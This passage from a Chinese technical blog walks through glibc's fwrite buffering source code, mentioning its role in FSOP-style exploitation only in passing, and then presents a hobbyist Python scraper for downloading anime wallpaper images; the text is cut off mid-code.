f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF+_IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_new_do_write(f, f-&gt;_IO_write_base,</span><br><span class="line">			    f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    <span class="comment">/* 执行_IO_new_do_write,利用系统调用write输出输出缓冲区 */</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_new_do_write(f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数功能主要是实现刷新输出缓冲区或建立缓冲区，其核心部分就是“_IO_new_do_write”（其他的代码都是进行检查或者更新设置）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (fp, data, to_do)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *data;</span><br><span class="line">     _IO_size_t to_do;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span> || new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(fp, data, to_do)</span></span></span><br><span class="line"><span class="function">     _IO_FILE *fp</span>;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *data;</span><br><span class="line">     _IO_size_t to_do;</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       is not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>); </span><br><span class="line">      <span class="comment">/* 调整文件偏移 */</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">/* 利用系统调用更新输出缓冲区 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="comment">/* 刷新设置缓冲区指针 */</span></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF+_IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>以块为单位直接输出数据</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.</span></span><br><span class="line"><span class="comment">	 dont_write is what gets left over. */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base; <span class="comment">/* 检查输出数据是否是大块 */</span></span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 如果超过输入缓冲区&quot;f-&gt;_IO_buf_end - f-&gt;_IO_buf_base&quot;的大小，则为了提高效率，不再使用输出缓冲区 */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">        &#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write); </span><br><span class="line">          <span class="comment">/* 以块为基本单位直接将缓冲区调用new_do_write输出 */</span></span><br><span class="line">	  to_do -= count;</span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write) </span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>已经经历过了 <code>_IO_OVERFLOW</code> ，此时的IO FILE缓冲区指针的状态是处于刷新的初始化状态，输出缓冲区中也没有数据</p>
<p>根据输出size的大小，判断是否需要继续使用输出缓存区</p>
<p><strong>剩余目标输出数据放入输出缓冲区中</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">     <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>跟进函数 _IO_default_xsputn ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_default_xsputn (f, data, n)</span><br><span class="line">     _IO_FILE *f;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">void</span> *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      _IO_ssize_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> ((_IO_size_t) count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>) <span class="comment">/* 当长度大于20时，使用memcpy拷贝 */</span></span><br><span class="line">	    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      s += count;</span><br><span class="line">            &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	    count = <span class="number">0</span>;</span><br><span class="line">	  <span class="keyword">else</span> <span class="comment">/* 当长度小于20时，使用for循环赋值拷贝 */</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      _IO_ssize_t i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="keyword">unsigned</span> <span class="keyword">char</span>) *s++) == EOF)</span><br><span class="line">          <span class="comment">/* 如果输出缓冲区为空，则调用_IO_OVERFLOW进行输出 */</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数最主要的作用就是将剩余的目标输出数据拷贝到输出缓冲区里 </p>
<hr>
<p>在 fwrite 的源码分析中，我们发现了一个老朋友： <code>_IO_OVERFLOW</code> </p>
<p><code>_IO_OVERFLOW</code> 可是FSOP的常客，因为发生内存错误时会调用 <code>_IO_flush_all_lockp</code> ，进而调用  <code>_IO_OVERFLOW</code> ，就是因为它容易触发并且容易被劫持（或伪造），FSOP才拥有如此广阔的应用范围</p>
<p>后续的漏洞利用分析中，我会重点分析FSOP的原理，主要原因还是我做了一个FSOP和堆上ORW相结合的题目（做的我想吐），趁着印象还比较深刻，想总结分析一下（还有个原因就是：之前总结的FSOP有点草率）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/31/%E7%88%AC%E8%99%AB%E5%B0%8F%E5%AD%90%EF%BC%9A%E4%BA%8C%E6%AC%A1%E5%85%83%E7%9A%84%E7%A6%8F%E9%9F%B3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/31/%E7%88%AC%E8%99%AB%E5%B0%8F%E5%AD%90%EF%BC%9A%E4%BA%8C%E6%AC%A1%E5%85%83%E7%9A%84%E7%A6%8F%E9%9F%B3/" class="post-title-link" itemprop="url">不务正业系列：爬虫小子（偶尔更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-31 21:22:10" itemprop="dateCreated datePublished" datetime="2022-03-31T21:22:10+08:00">2022-03-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-19 10:41:36" itemprop="dateModified" datetime="2022-05-19T10:41:36+08:00">2022-05-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NoMaoWork/" itemprop="url" rel="index"><span itemprop="name">NoMaoWork</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="爬虫小子：二次元的福音"><a href="#爬虫小子：二次元的福音" class="headerlink" title="爬虫小子：二次元的福音"></a>爬虫小子：二次元的福音</h2><p>计算机底层知识学累了，偶尔搞点不一定的来奖励自己（大雾）</p>
<p>最近在学习《Python网络数据采集》这本书，了解了许多与网络相关的知识，也体验了一下面向对象的程序设计，当然主要是学习爬虫的相关知识</p>
<p>自我感觉爬虫很容易上手，但精通可能够呛（特别是在反爬技术越来越高超的当下），这里就记录一下我的写的垃圾爬虫吧……</p>
<h2 id="爬虫小子-V1-0"><a href="#爬虫小子-V1-0" class="headerlink" title="爬虫小子_V1.0"></a>爬虫小子_V1.0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetURL</span>():</span></span><br><span class="line">    target = <span class="built_in">input</span>(<span class="string">&quot;please input your target:&quot;</span>)</span><br><span class="line">    html = urlopen(target)</span><br><span class="line">    bsObj = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    images = bsObj.findAll(<span class="string">&quot;img&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;rich_pages wxw-img&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> images</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateImages</span>(<span class="params">images,name</span>):</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        response = image.attrs[<span class="string">&quot;data-src&quot;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;finish！！！, now you get &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot; images&quot;</span>)</span><br><span class="line">        num = <span class="string">&quot;test_&quot;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        dtype = response.split(<span class="string">&#x27;=&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        num += <span class="string">&#x27;.&#x27;</span> + dtype</span><br><span class="line">        response = req.get(response)</span><br><span class="line">        os.makedirs(name, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(name+ <span class="string">&#x27;/&#x27;</span> +num, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            f.write(response.content)</span><br><span class="line"></span><br><span class="line">images=GetURL()</span><br><span class="line">CreateImages(images,name=<span class="built_in">input</span>(<span class="string">&quot;please input its name:&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>看看效果：</p>
<img src="/2022/03/31/%E7%88%AC%E8%99%AB%E5%B0%8F%E5%AD%90%EF%BC%9A%E4%BA%8C%E6%AC%A1%E5%85%83%E7%9A%84%E7%A6%8F%E9%9F%B3/1648733625138-1648911361178-1652928096410.png" class width="1648733625138"> 
<img src="/2022/03/31/%E7%88%AC%E8%99%AB%E5%B0%8F%E5%AD%90%EF%BC%9A%E4%BA%8C%E6%AC%A1%E5%85%83%E7%9A%84%E7%A6%8F%E9%9F%B3/1648733659898-1648911361178-1652928096410.png" class width="1648733659898"> 
<p>这里就不放图了，饥渴的兄弟可以自己爬一下……</p>
<p>更新日志：</p>
<ul>
<li>version：v1.0</li>
<li>date：2022.3.31</li>
<li>type：<ul>
<li>Features：NULL</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li>desc：<ul>
<li>第一代版本，功能很弱</li>
</ul>
</li>
</ul>
<h2 id="爬虫小子-V1-1"><a href="#爬虫小子-V1-1" class="headerlink" title="爬虫小子_V1.1"></a>爬虫小子_V1.1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">nowTime = time.time()</span><br><span class="line">random.seed(nowTime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetURL</span>():</span></span><br><span class="line">    target = <span class="built_in">input</span>(<span class="string">&quot;please input your target:&quot;</span>)</span><br><span class="line">    html = urlopen(target)</span><br><span class="line">    bsObj = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> bsObj</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetRandomURL</span>(<span class="params">link_list</span>):</span></span><br><span class="line">    target = link_list[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(link_list) - <span class="number">1</span>)]</span><br><span class="line">    html = urlopen(target)</span><br><span class="line">    bsObj = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    name = GetName(bsObj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The next one is &quot;</span> + name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Do you want to Download it?&quot;</span>)</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;Please input yes or no\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You want to Continue OK~~~&quot;</span>)</span><br><span class="line">        images = Getimage(bsObj)</span><br><span class="line">        Download(images, name)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;no&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Try again?&quot;</span>)</span><br><span class="line">        choice = <span class="built_in">input</span>(<span class="string">&quot;Please input yes or no\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">            GetRandomURL(link_list)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong choice~~~~&quot;</span>)</span><br><span class="line">        Exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">More</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Do you want more?&quot;</span>)</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;Please input yes or no\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hahaha I know you~~~~&quot;</span>)</span><br><span class="line">        Return()</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;no&quot;</span>:</span><br><span class="line">        Exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong choice~~~~&quot;</span>)</span><br><span class="line">        Exit()</span><br><span class="line">    More()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Return</span>():</span></span><br><span class="line">    target = <span class="string">&quot;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzUzNjA0MjkxMw==&amp;action=getalbum&amp;album_id=2119868775733706753&amp;scene=173&amp;from_msgid=2247561088&amp;from_itemidx=1&amp;count=3&amp;nolastread=1#wechat_redirect&quot;</span></span><br><span class="line">    html = urlopen(target)</span><br><span class="line">    bsObj = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    link_list = GetLinks(bsObj)</span><br><span class="line">    GetRandomURL(link_list)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Getimage</span>(<span class="params">bsObj</span>):</span></span><br><span class="line">    images = bsObj.findAll(<span class="string">&quot;img&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;rich_pages wxw-img&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> images</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetName</span>(<span class="params">bsObj</span>):</span></span><br><span class="line">    title = bsObj.find(<span class="string">&quot;h1&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;rich_media_title&quot;</span>&#125;)</span><br><span class="line">    name = <span class="string">&quot;image-&quot;</span> + title.string.split(<span class="string">&#x27;【二次元壁纸分享】&#x27;</span>)[-<span class="number">1</span>][:<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLinks</span>(<span class="params">bsObj</span>):</span></span><br><span class="line">    links = bsObj.findAll(<span class="string">&quot;li&quot;</span>,&#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;album__list-item js_album_item js_wx_tap_highlight wx_tap_cell&quot;</span>&#125;)</span><br><span class="line">    link_list = []</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">        <span class="keyword">if</span> link.attrs[<span class="string">&#x27;data-link&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;data-link&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> link_list:</span><br><span class="line">                link_list.append(link.attrs[<span class="string">&#x27;data-link&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> link_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Download</span>(<span class="params">images,name</span>):</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;finish！！！, now you get &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; images&quot;</span>)</span><br><span 